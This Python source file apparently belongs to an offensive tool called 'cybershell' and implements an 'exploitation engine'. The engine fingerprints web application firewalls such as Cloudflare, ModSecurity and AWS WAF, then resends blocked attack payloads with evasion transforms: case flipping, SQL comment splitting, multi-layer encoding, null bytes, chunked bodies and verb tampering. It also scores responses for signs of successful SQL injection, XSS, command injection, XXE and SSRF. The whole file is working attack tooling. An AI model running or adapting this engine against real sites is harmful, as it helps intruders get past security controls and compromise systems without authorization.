"""
Enhanced HTTP Exploitation Engine with WAF Bypass Integration
=============================================================
Integrates WAFAwareHTTPEngine and bypass techniques for resilient exploitation.
"""

import requests
import time
import json
import hashlib
import random
import string
import base64
from typing import Dict, Any, Optional, List, Tuple, Union
from urllib.parse import urlparse, urlencode, parse_qs, quote, unquote
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from dataclasses import dataclass, field, asdict
from datetime import datetime
from collections import defaultdict
import re

# Try to import enhanced components
try:
    from .enhanced.waf_aware_http_engine import WAFAwareHTTPEngine
    from .bypass_system import UnifiedBypassSystem, BypassPlugin, ProtectionDetection
    ENHANCED_COMPONENTS_AVAILABLE = True
except ImportError:
    ENHANCED_COMPONENTS_AVAILABLE = False
    # Create stubs if not available
    class WAFAwareHTTPEngine:
        def __init__(self, config=None):
            pass
        
        async def send_payload_with_bypass(self, **kwargs):
            return {'success': False, 'error': 'WAFAwareHTTPEngine not available'}
    
    class UnifiedBypassSystem:
        def __init__(self, config=None):
            pass
        
        def detect_protections(self, target):
            return {'protections': []}
    
    class BypassPlugin:
        pass
    
    class ProtectionDetection:
        pass

logger = logging.getLogger(__name__)

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class HTTPRequest:
    """Enhanced HTTP request representation"""
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    params: Dict[str, Any] = field(default_factory=dict)
    data: Optional[Union[str, Dict, bytes]] = None
    json_data: Optional[Dict] = None
    timeout: float = 10.0
    allow_redirects: bool = True
    verify_ssl: bool = False
    proxy: Optional[Dict[str, str]] = None

@dataclass
class HTTPResponse:
    """Enhanced HTTP response representation"""
    status_code: int
    headers: Dict[str, str]
    content: bytes
    text: str
    url: str
    elapsed_time: float
    cookies: Dict[str, str]
    history: List[Any] = field(default_factory=list)
    json_data: Optional[Dict] = None
    waf_detected: bool = False
    waf_type: Optional[str] = None
    bypass_used: Optional[str] = None

@dataclass
class ExploitationResult:
    """Result of exploitation attempt"""
    success: bool
    evidence_id: Optional[str]
    status_code: int
    response_time: float
    analysis: Dict[str, Any]
    raw_response: Optional[HTTPResponse]
    error: Optional[str] = None
    waf_encountered: bool = False
    waf_bypassed: bool = False
    bypass_technique: Optional[str] = None
    indicators: List[str] = field(default_factory=list)

# ============================================================================
# BYPASS TECHNIQUES
# ============================================================================

class BypassTechniques:
    """Collection of WAF bypass techniques"""
    
    @staticmethod
    def apply_case_variation(payload: str) -> str:
        """Apply random case variation"""
        return ''.join(c.swapcase() if random.random() > 0.5 else c for c in payload)
    
    @staticmethod
    def apply_comment_injection(payload: str) -> str:
        """Inject SQL comments to break patterns"""
        sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        
        for keyword in sql_keywords:
            if keyword in result.upper():
                # Insert comment in middle of keyword
                mid = len(keyword) // 2
                replacement = f"{keyword[:mid]}/**/{ keyword[mid:]}"
                result = re.sub(keyword, replacement, result, flags=re.IGNORECASE)
        
        return result
    
    @staticmethod
    def apply_encoding(payload: str, encoding_type: str = "url") -> str:
        """Apply various encoding techniques"""
        if encoding_type == "url":
            return quote(payload)
        elif encoding_type == "double_url":
            return quote(quote(payload))
        elif encoding_type == "unicode":
            return ''.join(f'\\u{ord(c):04x}' if ord(c) < 128 else c for c in payload)
        elif encoding_type == "html_entity":
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    @staticmethod
    def apply_null_bytes(payload: str) -> str:
        """Insert null bytes to evade pattern matching"""
        # Insert null bytes before suspicious patterns
        patterns = ['<script', 'SELECT', 'UNION', 'javascript:', 'onerror']
        result = payload
        
        for pattern in patterns:
            if pattern.lower() in result.lower():
                result = result.replace(pattern, f'%00{pattern}')
        
        return result
    
    @staticmethod
    def apply_chunked_encoding(payload: str) -> str:
        """Apply chunked transfer encoding"""
        # This would need to be handled at the HTTP level
        # Returning marker for the engine to handle
        return f"CHUNKED:{payload}"
    
    @staticmethod
    def apply_http_parameter_pollution(payload: str, param_name: str) -> Dict[str, List[str]]:
        """Apply HTTP Parameter Pollution"""
        # Split payload across multiple parameters
        mid = len(payload) // 2
        return {
            param_name: [payload[:mid]],
            f"{param_name}": [payload[mid:]]
        }
    
    @staticmethod
    def apply_unicode_normalization(payload: str) -> str:
        """Apply Unicode normalization bypass"""
        # Replace characters with Unicode equivalents
        replacements = {
            '<': '\uff1c',
            '>': '\uff1e',
            '"': '\uff02',
            "'": '\uff07',
            '/': '\uff0f',
            '\\': '\uff3c'
        }
        
        result = payload
        for char, unicode_char in replacements.items():
            result = result.replace(char, unicode_char)
        
        return result
    
    @staticmethod
    def apply_http_verb_tampering(method: str) -> str:
        """Tamper with HTTP verb"""
        # Some WAFs don't inspect non-standard methods
        tampered_methods = {
            'GET': 'G3T',
            'POST': 'P0ST',
            'PUT': 'PUT',
            'DELETE': 'D3L3T3'
        }
        
        return tampered_methods.get(method, method)

# ============================================================================
# ENHANCED HTTP ENGINE
# ============================================================================

class HTTPEngine:
    """Enhanced HTTP request engine with WAF bypass capabilities"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.session = self._create_session()
        self.evidence = []
        self.request_history = []
        self.bypass_techniques = BypassTechniques()
        
        # Initialize bypass system
        self.bypass_system = None
        if ENHANCED_COMPONENTS_AVAILABLE:
            try:
                self.bypass_system = UnifiedBypassSystem(config)
                logger.info("UnifiedBypassSystem integrated")
            except Exception as e:
                logger.warning(f"Could not initialize UnifiedBypassSystem: {e}")
        
        # Initialize WAF-aware engine
        self.waf_engine = None
        if ENHANCED_COMPONENTS_AVAILABLE:
            try:
                self.waf_engine = WAFAwareHTTPEngine(config)
                logger.info("WAFAwareHTTPEngine integrated")
            except Exception as e:
                logger.warning(f"Could not initialize WAFAwareHTTPEngine: {e}")
        
        # WAF detection patterns
        self.waf_patterns = self._init_waf_patterns()
        
        # Statistics
        self.stats = defaultdict(int)
    
    def _create_session(self) -> requests.Session:
        """Create session with retry strategy and custom settings"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': self.config.get('user_agent', 
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        })
        
        return session
    
    def _init_waf_patterns(self) -> Dict[str, List[Dict]]:
        """Initialize WAF detection patterns"""
        return {
            'cloudflare': [
                {'header': 'CF-RAY', 'weight': 1.0},
                {'header': 'cf-request-id', 'weight': 0.9},
                {'body': 'Cloudflare Ray ID', 'weight': 1.0},
                {'status': 403, 'body': 'cloudflare', 'weight': 0.8}
            ],
            'akamai': [
                {'header': 'AkamaiGHost', 'weight': 1.0},
                {'header': 'X-Akamai', 'weight': 0.9},
                {'body': 'akamai', 'weight': 0.5}
            ],
            'aws_waf': [
                {'header': 'X-AMZ-CF-ID', 'weight': 0.8},
                {'status': 403, 'body': 'AWS WAF', 'weight': 1.0}
            ],
            'modsecurity': [
                {'header': 'Server', 'value': 'ModSecurity', 'weight': 1.0},
                {'body': 'ModSecurity', 'weight': 0.9}
            ],
            'f5_bigip': [
                {'header': 'X-F5', 'weight': 0.9},
                {'cookie': 'BIGipServer', 'weight': 1.0}
            ],
            'imperva': [
                {'header': 'X-Iinfo', 'weight': 1.0},
                {'body': 'Incapsula', 'weight': 0.9}
            ]
        }
    
    def send_payload(self, target: str, payload: str, method: str = "GET", 
                     param: Optional[str] = None, **kwargs) -> ExploitationResult:
        """
        Enhanced payload sending with automatic WAF detection and bypass
        
        Returns:
            ExploitationResult with success, evidence, and bypass information
        """
        start_time = time.time()
        
        # First, detect WAF if bypass system available
        waf_info = self._detect_waf(target) if self.bypass_system else {}
        
        # If WAF detected and waf_engine available, use it
        if waf_info.get('waf_detected') and self.waf_engine:
            return self._send_with_waf_engine(target, payload, method, param, waf_info, **kwargs)
        
        # Otherwise, use standard approach with bypass attempts
        return self._send_standard(target, payload, method, param, waf_info, **kwargs)
    
    def _detect_waf(self, target: str) -> Dict[str, Any]:
        """Detect WAF presence and type"""
        if self.bypass_system:
            try:
                detection_result = self.bypass_system.detect_protections(target)
                
                for protection in detection_result.get('protections', []):
                    if protection.get('type') == 'WAF' and protection.get('detected'):
                        return {
                            'waf_detected': True,
                            'waf_type': protection.get('name', 'unknown'),
                            'confidence': protection.get('confidence', 0.5)
                        }
            except Exception as e:
                logger.warning(f"WAF detection failed: {e}")
        
        # Fallback to basic detection
        return self._basic_waf_detection(target)
    
    def _basic_waf_detection(self, target: str) -> Dict[str, Any]:
        """Basic WAF detection using patterns"""
        try:
            # Send benign request
            response = self.session.get(target, timeout=5, verify=False)
            
            # Check patterns
            for waf_name, patterns in self.waf_patterns.items():
                score = 0.0
                
                for pattern in patterns:
                    if 'header' in pattern:
                        if pattern['header'] in response.headers:
                            if 'value' in pattern:
                                if pattern['value'] in response.headers[pattern['header']]:
                                    score += pattern['weight']
                            else:
                                score += pattern['weight']
                    
                    if 'body' in pattern and pattern['body'].lower() in response.text.lower():
                        score += pattern['weight']
                    
                    if 'status' in pattern and response.status_code == pattern['status']:
                        score += pattern.get('weight', 0.5)
                    
                    if 'cookie' in pattern:
                        for cookie_name in response.cookies:
                            if pattern['cookie'] in cookie_name:
                                score += pattern['weight']
                
                if score >= 0.7:
                    return {
                        'waf_detected': True,
                        'waf_type': waf_name,
                        'confidence': min(score, 1.0)
                    }
        
        except Exception as e:
            logger.debug(f"Basic WAF detection error: {e}")
        
        return {'waf_detected': False}
    
    def _send_with_waf_engine(self, target: str, payload: str, method: str,
                             param: Optional[str], waf_info: Dict, **kwargs) -> ExploitationResult:
        """Send payload using WAFAwareHTTPEngine"""
        import asyncio
        
        try:
            # Run async method in sync context
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            result = loop.run_until_complete(
                self.waf_engine.send_payload_with_bypass(
                    target=target,
                    payload=payload,
                    method=method,
                    param=param,
                    **kwargs
                )
            )
            
            # Convert to ExploitationResult
            return ExploitationResult(
                success=result.get('success', False),
                evidence_id=result.get('evidence_id'),
                status_code=result.get('status_code', 0),
                response_time=result.get('response_time', 0),
                analysis=result.get('analysis', {}),
                raw_response=None,
                waf_encountered=True,
                waf_bypassed=result.get('bypass_used') is not None,
                bypass_technique=result.get('bypass_used'),
                indicators=result.get('indicators', [])
            )
            
        except Exception as e:
            logger.error(f"WAF engine error: {e}")
            # Fall back to standard method
            return self._send_standard(target, payload, method, param, waf_info, **kwargs)
    
    def _send_standard(self, target: str, payload: str, method: str,
                      param: Optional[str], waf_info: Dict, **kwargs) -> ExploitationResult:
        """Standard payload sending with bypass attempts"""
        start_time = time.time()
        
        # First attempt without bypass
        result = self._execute_request(target, payload, method, param, **kwargs)
        
        # If blocked and WAF detected, try bypass techniques
        if self._is_blocked(result) and waf_info.get('waf_detected'):
            logger.info(f"Request blocked by {waf_info.get('waf_type', 'unknown')} WAF, attempting bypass...")
            
            # Try various bypass techniques
            bypass_techniques = self._get_bypass_techniques(waf_info.get('waf_type', 'unknown'))
            
            for technique_name, technique_func in bypass_techniques:
                logger.debug(f"Trying bypass technique: {technique_name}")
                
                # Apply bypass technique
                bypassed_payload = technique_func(payload)
                
                # Handle special cases
                if isinstance(bypassed_payload, dict):
                    # HTTP Parameter Pollution
                    result = self._execute_request(
                        target, '', method, None,
                        params=bypassed_payload, **kwargs
                    )
                elif bypassed_payload.startswith('CHUNKED:'):
                    # Chunked encoding - needs special handling
                    actual_payload = bypassed_payload.replace('CHUNKED:', '')
                    result = self._execute_chunked_request(
                        target, actual_payload, method, param, **kwargs
                    )
                else:
                    result = self._execute_request(
                        target, bypassed_payload, method, param, **kwargs
                    )
                
                if not self._is_blocked(result):
                    logger.info(f"Bypass successful using {technique_name}")
                    result['bypass_technique'] = technique_name
                    result['waf_bypassed'] = True
                    break
        
        # Analyze response
        analysis = self._analyze_response(
            result.get('response'),
            payload,
            waf_info.get('waf_detected', False)
        )
        
        # Collect evidence
        evidence_id = self._collect_evidence(target, payload, method, param, result, analysis)
        
        # Update statistics
        self.stats['total_requests'] += 1
        if analysis['vulnerable']:
            self.stats['successful_exploits'] += 1
        if waf_info.get('waf_detected'):
            self.stats['waf_encounters'] += 1
        if result.get('waf_bypassed'):
            self.stats['waf_bypasses'] += 1
        
        return ExploitationResult(
            success=analysis['vulnerable'],
            evidence_id=evidence_id,
            status_code=result.get('status_code', 0),
            response_time=time.time() - start_time,
            analysis=analysis,
            raw_response=result.get('response'),
            error=result.get('error'),
            waf_encountered=waf_info.get('waf_detected', False),
            waf_bypassed=result.get('waf_bypassed', False),
            bypass_technique=result.get('bypass_technique'),
            indicators=analysis.get('indicators', [])
        )
    
    def _execute_request(self, target: str, payload: str, method: str,
                        param: Optional[str], **kwargs) -> Dict[str, Any]:
        """Execute HTTP request with payload"""
        try:
            # Prepare request
            if method.upper() == "GET":
                if param:
                    parsed = urlparse(target)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    # Allow params override from kwargs
                    if 'params' in kwargs:
                        params.update(kwargs.pop('params'))
                    target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    response = self.session.get(target, params=params, timeout=10, verify=False, **kwargs)
                else:
                    response = self.session.get(target, timeout=10, verify=False, **kwargs)
                
            elif method.upper() == "POST":
                data = {param: payload} if param else payload
                # Allow data override from kwargs
                if 'data' in kwargs:
                    data = kwargs.pop('data')
                response = self.session.post(target, data=data, timeout=10, verify=False, **kwargs)
                
            else:
                response = self.session.request(method, target, data=payload, timeout=10, verify=False, **kwargs)
            
            return {
                'success': True,
                'response': self._create_http_response(response),
                'status_code': response.status_code
            }
            
        except requests.exceptions.RequestException as e:
            logger.error(f"Request failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'status_code': 0
            }
    
    def _execute_chunked_request(self, target: str, payload: str, method: str,
                                 param: Optional[str], **kwargs) -> Dict[str, Any]:
        """Execute request with chunked transfer encoding"""
        try:
            # Prepare chunked data
            def chunk_generator():
                # Split payload into chunks
                chunk_size = 10
                for i in range(0, len(payload), chunk_size):
                    chunk = payload[i:i+chunk_size]
                    yield chunk.encode()
            
            headers = kwargs.get('headers', {})
            headers['Transfer-Encoding'] = 'chunked'
            
            if method.upper() == "POST":
                response = self.session.post(
                    target,
                    data=chunk_generator(),
                    headers=headers,
                    timeout=10,
                    verify=False
                )
            else:
                response = self.session.request(
                    method,
                    target,
                    data=chunk_generator(),
                    headers=headers,
                    timeout=10,
                    verify=False
                )
            
            return {
                'success': True,
                'response': self._create_http_response(response),
                'status_code': response.status_code
            }
            
        except Exception as e:
            logger.error(f"Chunked request failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'status_code': 0
            }
    
    def _create_http_response(self, response: requests.Response) -> HTTPResponse:
        """Create HTTPResponse object from requests.Response"""
        try:
            json_data = response.json()
        except:
            json_data = None
        
        return HTTPResponse(
            status_code=response.status_code,
            headers=dict(response.headers),
            content=response.content,
            text=response.text,
            url=response.url,
            elapsed_time=response.elapsed.total_seconds(),
            cookies=dict(response.cookies),
            history=[r.status_code for r in response.history],
            json_data=json_data
        )
    
    def _is_blocked(self, result: Dict) -> bool:
        """Check if request was blocked"""
        if not result.get('success'):
            return True
        
        response = result.get('response')
        if not response:
            return True
        
        # Check for common block indicators
        if response.status_code in [403, 406, 419, 429, 503]:
            return True
        
        # Check for WAF block messages
        block_patterns = [
            'access denied',
            'forbidden',
            'blocked',
            'security violation',
            'malicious',
            'attack detected',
            'waf',
            'firewall'
        ]
        
        for pattern in block_patterns:
            if pattern in response.text.lower():
                return True
        
        return False
    
    def _get_bypass_techniques(self, waf_type: str) -> List[Tuple[str, callable]]:
        """Get appropriate bypass techniques for WAF type"""
        techniques = []
        
        # Universal techniques
        techniques.extend([
            ('case_variation', self.bypass_techniques.apply_case_variation),
            ('url_encoding', lambda p: self.bypass_techniques.apply_encoding(p, 'url')),
            ('double_url_encoding', lambda p: self.bypass_techniques.apply_encoding(p, 'double_url')),
        ])
        
        # WAF-specific techniques
        if waf_type == 'cloudflare':
            techniques.extend([
                ('null_bytes', self.bypass_techniques.apply_null_bytes),
                ('unicode_normalization', self.bypass_techniques.apply_unicode_normalization),
            ])
        elif waf_type == 'modsecurity':
            techniques.extend([
                ('comment_injection', self.bypass_techniques.apply_comment_injection),
                ('chunked_encoding', self.bypass_techniques.apply_chunked_encoding),
            ])
        elif waf_type == 'aws_waf':
            techniques.extend([
                ('unicode_encoding', lambda p: self.bypass_techniques.apply_encoding(p, 'unicode')),
                ('html_entity_encoding', lambda p: self.bypass_techniques.apply_encoding(p, 'html_entity')),
            ])
        else:
            # Generic techniques for unknown WAF
            techniques.extend([
                ('comment_injection', self.bypass_techniques.apply_comment_injection),
                ('unicode_encoding', lambda p: self.bypass_techniques.apply_encoding(p, 'unicode')),
                ('null_bytes', self.bypass_techniques.apply_null_bytes),
            ])
        
        return techniques
    
    def _analyze_response(self, response: Optional[HTTPResponse], payload: str,
                         waf_detected: bool = False) -> Dict[str, Any]:
        """Enhanced response analysis"""
        
        if not response:
            return {
                'vulnerable': False,
                'confidence': 0.0,
                'indicators': [],
                'waf_blocked': waf_detected
            }
        
        vulnerable = False
        confidence = 0.0
        indicators = []
        
        # Check for payload reflection
        if payload in response.text:
            indicators.append('payload_reflected')
            confidence += 0.3
            
            # Check if it's actually executed (for XSS)
            if '<script>' in payload and '</script>' in response.text:
                if not re.search(r'&lt;script&gt;.*&lt;/script&gt;', response.text):
                    indicators.append('xss_not_encoded')
                    vulnerable = True
                    confidence += 0.5
        
        # Check for SQL errors
        sql_errors = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
            'SQLite', 'Microsoft SQL', 'Incorrect syntax',
            'Unknown column', 'Unclosed quotation mark'
        ]
        for error in sql_errors:
            if error.lower() in response.text.lower():
                indicators.append(f'sql_error:{error}')
                vulnerable = True
                confidence += 0.5
                break
        
        # Check for command injection indicators
        cmd_indicators = [
            ('uid=', 'linux_user_id'),
            ('gid=', 'linux_group_id'),
            ('groups=', 'linux_groups'),
            ('/bin/', 'linux_path'),
            ('/etc/passwd', 'passwd_file'),
            ('Windows IP Configuration', 'windows_ipconfig'),
            ('Volume in drive', 'windows_dir')
        ]
        for pattern, indicator_name in cmd_indicators:
            if pattern in response.text:
                indicators.append(f'cmd_injection:{indicator_name}')
                vulnerable = True
                confidence += 0.6
                break
        
        # Check for XXE indicators
        if '<!DOCTYPE' in payload and 'ENTITY' in payload:
            if 'root:' in response.text or 'bin:' in response.text:
                indicators.append('xxe:file_disclosed')
                vulnerable = True
                confidence += 0.7
        
        # Check for SSRF indicators
        if 'http://' in payload or 'https://' in payload:
            # Check if internal resources were accessed
            internal_patterns = ['127.0.0.1', 'localhost', '169.254.169.254', 'metadata']
            for pattern in internal_patterns:
                if pattern in response.text and pattern not in payload:
                    indicators.append(f'ssrf:{pattern}')
                    vulnerable = True
                    confidence += 0.5
                    break
        
        # Time-based detection
        if response.elapsed_time > 5:
            indicators.append('time_delay')
            confidence += 0.2
            
            # Strong indicator if delay matches payload
            if 'sleep(' in payload.lower() or 'waitfor' in payload.lower():
                delay_match = re.search(r'(?:sleep|waitfor[^0-9]+)([0-9]+)', payload.lower())
                if delay_match:
                    expected_delay = int(delay_match.group(1))
                    if abs(response.elapsed_time - expected_delay) < 1:
                        indicators.append('time_delay_matched')
                        vulnerable = True
                        confidence += 0.5
        
        # Status code analysis
        if response.status_code == 500:
            indicators.append('server_error')
            confidence += 0.1
            
            # Higher confidence if payload likely caused it
            if any(char in payload for char in ["'", '"', '<', '>', '{', '}']):
                confidence += 0.2
        
        elif response.status_code == 200 and vulnerable:
            confidence += 0.1
        
        # WAF bypass success indicator
        if waf_detected and response.status_code == 200:
            indicators.append('waf_bypass_successful')
            confidence += 0.2
        
        confidence = min(confidence, 1.0)
        
        return {
            'vulnerable': vulnerable,
            'confidence': confidence,
            'indicators': indicators,
            'content_length': len(response.text),
            'response_time': response.elapsed_time,
            'status_code': response.status_code,
            'waf_blocked': waf_detected and response.status_code in [403, 406]
        }
    
    def _collect_evidence(self, target: str, payload: str, method: str,
                         param: Optional[str], result: Dict, analysis: Dict) -> str:
        """Collect and store evidence"""
        evidence_id = hashlib.md5(f"{target}{payload}{time.time()}".encode()).hexdigest()[:8]
        
        evidence = {
            'id': evidence_id,
            'timestamp': datetime.now().isoformat(),
            'request': {
                'method': method,
                'url': target,
                'payload': payload,
                'param': param,
                'headers': dict(self.session.headers)
            },
            'response': {
                'status_code': result.get('status_code', 0),
                'headers': result.get('response').headers if result.get('response') else {},
                'body': result.get('response').text[:5000] if result.get('response') else '',
                'time': result.get('response').elapsed_time if result.get('response') else 0
            },
            'analysis': analysis,
            'bypass_info': {
                'waf_detected': analysis.get('waf_blocked', False),
                'bypass_attempted': result.get('bypass_technique') is not None,
                'bypass_technique': result.get('bypass_technique'),
                'bypass_successful': result.get('waf_bypassed', False)
            }
        }
        
        self.evidence.append(evidence)
        self.request_history.append(evidence_id)
        
        return evidence_id
    
    def get_evidence(self, evidence_id: str) -> Optional[Dict]:
        """Retrieve specific evidence by ID"""
        for ev in self.evidence:
            if ev['id'] == evidence_id:
                return ev
        return None
    
    def get_all_evidence(self) -> List[Dict]:
        """Get all collected evidence"""
        return self.evidence
    
    def clear_evidence(self):
        """Clear evidence cache"""
        self.evidence = []
        self.request_history = []
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get exploitation statistics"""
        return {
            'total_requests': self.stats['total_requests'],
            'successful_exploits': self.stats['successful_exploits'],
            'success_rate': self.stats['successful_exploits'] / max(1, self.stats['total_requests']),
            'waf_encounters': self.stats['waf_encounters'],
            'waf_bypasses': self.stats['waf_bypasses'],
            'waf_bypass_rate': self.stats['waf_bypasses'] / max(1, self.stats['waf_encounters']),
            'evidence_collected': len(self.evidence)
        }

# ============================================================================
# ENHANCED PATCH FUNCTION
# ============================================================================

def patch_plugin_with_http(plugin_class):
    """Enhanced decorator to add WAF-aware HTTP capabilities to plugins"""
    
    original_run = plugin_class.run
    
    def new_run(self, **kwargs):
        # Check if we should use real HTTP
        if kwargs.get('use_real_http', True):
            
            # Initialize enhanced HTTP engine if not exists
            if not hasattr(self, 'http_engine'):
                self.http_engine = HTTPEngine(kwargs.get('config'))
            
            target = kwargs.get('target', '')
            payload = kwargs.get('payload', '')
            
            # Send request with WAF bypass capabilities
            result = self.http_engine.send_payload(
                target=target,
                payload=payload,
                method=kwargs.get('method', 'GET'),
                param=kwargs.get('param')
            )
            
            if result.success:
                # Return enhanced result
                from cybershell.plugin_runtime import PluginResult
                return PluginResult(
                    name=self.name,
                    success=True,
                    details={
                        'vulnerable': True,
                        'evidence_id': result.evidence_id,
                        'confidence': result.analysis['confidence'],
                        'indicators': result.analysis['indicators'],
                        'response_time': result.response_time,
                        'waf_encountered': result.waf_encountered,
                        'waf_bypassed': result.waf_bypassed,
                        'bypass_technique': result.bypass_technique
                    },
                    evidence_score=result.analysis['confidence']
                )
        
        # Fallback to original implementation
        return original_run(self, **kwargs)
    
    plugin_class.run = new_run
    return plugin_class

# ============================================================================
# ASYNC WRAPPER FOR COMPATIBILITY
# ============================================================================

class AsyncHTTPEngine(HTTPEngine):
    """Async wrapper for compatibility with async code"""
    
    async def send_payload_async(self, target: str, payload: str, method: str = "GET",
                                 param: Optional[str] = None, **kwargs) -> ExploitationResult:
        """Async version of send_payload"""
        # Run in thread to avoid blocking
        import asyncio
        import concurrent.futures
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            result = await asyncio.get_event_loop().run_in_executor(
                executor,
                self.send_payload,
                target, payload, method, param
            )
        
        return result

# ============================================================================
# BACKWARD COMPATIBILITY
# ============================================================================

# Alias for backward compatibility
EnhancedHTTPEngine = HTTPEngine

def create_http_engine(config: Optional[Dict] = None, use_waf_aware: bool = True) -> HTTPEngine:
    """Factory function to create HTTP engine"""
    if use_waf_aware and ENHANCED_COMPONENTS_AVAILABLE:
        logger.info("Creating enhanced HTTP engine with WAF awareness")
    else:
        logger.info("Creating standard HTTP engine")
    
    return HTTPEngine(config)

# Export main classes and functions
__all__ = [
    'HTTPEngine',
    'AsyncHTTPEngine',
    'EnhancedHTTPEngine',
    'HTTPRequest',
    'HTTPResponse',
    'ExploitationResult',
    'BypassTechniques',
    'patch_plugin_with_http',
    'create_http_engine'
]
